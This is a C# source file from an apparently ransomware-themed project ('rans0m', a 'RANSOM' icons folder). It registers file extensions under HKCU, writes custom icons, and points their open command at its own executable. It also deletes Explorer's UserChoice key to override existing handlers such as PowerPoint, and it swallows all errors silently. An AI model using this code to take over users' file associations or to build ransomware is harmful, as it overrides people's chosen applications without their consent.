using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace rans0m
{
    public static class FileTypeRegister
    {
        private const string ClassesRoot = @"Software\Classes";

        // ----------------------------- PUBLIC METHODS -----------------------------

        /// <summary>
        /// Registers a file type with the specified extension and icon.
        /// </summary>
        public static void RegisterIconForExtension(string extension, byte[] iconData, string fileTypeName)
        {
            using MemoryStream ms = new MemoryStream(iconData);
            Icon icon = new Icon(ms);

            using (icon)
            {
                string iconPath = SaveIconToDisk(icon, extension.TrimStart('.'));
                RegisterExtensionKeys(extension, iconPath, fileTypeName);
            }
        }

        /// <summary>
        /// Registers a file type with the specified extension using an icon generated from a Bitmap.
        /// </summary>
        public static void RegisterBitmapForExtension(string extension, Bitmap bmp, string fileTypeName)
        {
            try
            {
                string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RANSOM", "Icons");
                Directory.CreateDirectory(folder);
                string iconPath = Path.Combine(folder, extension.TrimStart('.') + ".ico");

                // Windows Explorer requires 256x256 (bWidth=0, bHeight=0) for PNG-compressed icons in .ico files
                using (var resized = new Bitmap(256, 256, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
                {
                    using (var g = Graphics.FromImage(resized))
                    {
                        g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                        g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;
                        g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
                        g.Clear(Color.Transparent);
                        g.DrawImage(bmp, 0, 0, 256, 256);
                    }

                    using (var pngMs = new MemoryStream())
                    {
                        resized.Save(pngMs, System.Drawing.Imaging.ImageFormat.Png);
                        byte[] pngBytes = pngMs.ToArray();

                        using var fs = new FileStream(iconPath, FileMode.Create, FileAccess.Write);
                        using var bw = new BinaryWriter(fs);

                        // ICONDIR
                        bw.Write((short)0); // reserved
                        bw.Write((short)1); // type 1 = icon
                        bw.Write((short)1); // count = 1

                        // ICONDIRENTRY (width 0 = 256, height 0 = 256)
                        bw.Write((byte)0);   // width 0 = 256
                        bw.Write((byte)0);   // height 0 = 256
                        bw.Write((byte)0);   // color count
                        bw.Write((byte)0);   // reserved
                        bw.Write((short)1);  // planes
                        bw.Write((short)32); // bit count
                        bw.Write((int)pngBytes.Length); // bytes in resource
                        bw.Write((int)22);   // offset of image data

                        // PNG image data
                        bw.Write(pngBytes);
                    }
                }

                RegisterExtensionKeys(extension, iconPath, fileTypeName);
            }
            catch { }
        }

        private static void RegisterExtensionKeys(string extension, string iconPath, string fileTypeName)
        {
            try
            {
                // Maps the extension to fileTypeName in HKCU\Software\Classes
                using (var extKey = Registry.CurrentUser.CreateSubKey(Combine(ClassesRoot, extension)))
                { extKey?.SetValue("", fileTypeName); }

                // Links the .ico file to the fileTypeName
                using (var defaultIconKey = Registry.CurrentUser.CreateSubKey(Combine(ClassesRoot, fileTypeName, "DefaultIcon")))
                { defaultIconKey?.SetValue("", iconPath); }

                // Links double-click Open command to our executable
                using (var cmdKey = Registry.CurrentUser.CreateSubKey(Combine(ClassesRoot, fileTypeName, @"shell\open\command")))
                { cmdKey?.SetValue("", $"\"{Application.ExecutablePath}\" \"%1\""); }

                // Clean up HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\<ext>
                // to prevent Explorer from overriding our association with OpenWith or preexisting apps (e.g. PowerPoint for .pot)
                try
                {
                    using var fileExtsKey = Registry.CurrentUser.CreateSubKey($@"Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\{extension}");
                    if (fileExtsKey != null)
                    {
                        fileExtsKey.DeleteSubKeyTree("UserChoice", false);
                        using var progIds = fileExtsKey.CreateSubKey("OpenWithProgids");
                        progIds?.SetValue(fileTypeName, Array.Empty<byte>(), RegistryValueKind.None);
                    }
                }
                catch { }

                NotifyShellOfChange();
            }
            catch { }
        }

        /// <summary>
        /// Unregisters a file type with the specified extension and icon.
        /// </summary>
        public static void UnregisterFileType(string extension, string fileTypeName) // Not used, idk if I want to implement it
        {
            Registry.CurrentUser.DeleteSubKeyTree(Combine(ClassesRoot, extension), throwOnMissingSubKey: false);
            Registry.CurrentUser.DeleteSubKeyTree(Combine(ClassesRoot, fileTypeName), throwOnMissingSubKey: false);
            NotifyShellOfChange();
        }





        // ----------------------------- PRIVATE METHODS -----------------------------

        private static string SaveIconToDisk(Icon icon, string extensionName)
        {
            string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RANSOM", "Icons");
            Directory.CreateDirectory(folder);

            string iconPath = Path.Combine(folder, extensionName + ".ico");
            using var fs = new FileStream(iconPath, FileMode.Create, FileAccess.Write);
            icon.Save(fs);
            return iconPath;
        }

        private static string Combine(params string[] parts)
        {
            return string.Join("\\", Array.FindAll(parts, p => !string.IsNullOrEmpty(p)));
        }

        private static void NotifyShellOfChange()
        {
            const uint SHCNE_ASSOCCHANGED = 0x08000000;
            const uint SHCNF_IDLIST = 0x0000;
            NativeMethods.SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);
        }

        public static void NotifyShellFileDeleted(string filePath)
        {
            try
            {
                const uint SHCNE_DELETE = 0x00000004;
                const uint SHCNF_PATHW = 0x0005;
                IntPtr pPath = Marshal.StringToHGlobalUni(filePath);
                try
                {
                    NativeMethods.SHChangeNotify(SHCNE_DELETE, SHCNF_PATHW, pPath, IntPtr.Zero);
                }
                finally
                {
                    Marshal.FreeHGlobal(pPath);
                }
            }
            catch { }
        }

        private static class NativeMethods
        {
            [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
            public static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);
        }
    }
}